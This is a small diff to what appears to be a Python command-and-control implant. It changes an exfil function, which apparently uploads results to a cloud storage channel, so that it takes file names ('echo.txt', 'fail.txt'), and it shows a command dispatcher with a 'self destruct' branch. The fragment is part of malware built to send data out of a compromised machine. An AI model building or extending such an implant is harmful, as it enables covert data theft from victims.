@@ -86,9 +86,9 @@ def execcmd(cmd: list[str]):
     elif ct == "sd": # self destruct
         sd()
     elif ct == "stat": # exfiltrate echo of command parameter
-        exfil(cp.encode())
+        exfil(cp.encode(),'echo.txt')
     else: # exfiltrate failure status
-        exfil("failure".encode())
+        exfil("failure".encode(),'fail.txt')
 
 def ls(cp: str):
     """
@@ -168,7 +168,7 @@ def exfil(info: bytes,file_name: str):
     body=metadata,
     media_body = upload_file
     )
-    
+
     response = None
     while response is None:
         response = results.next_chunk()
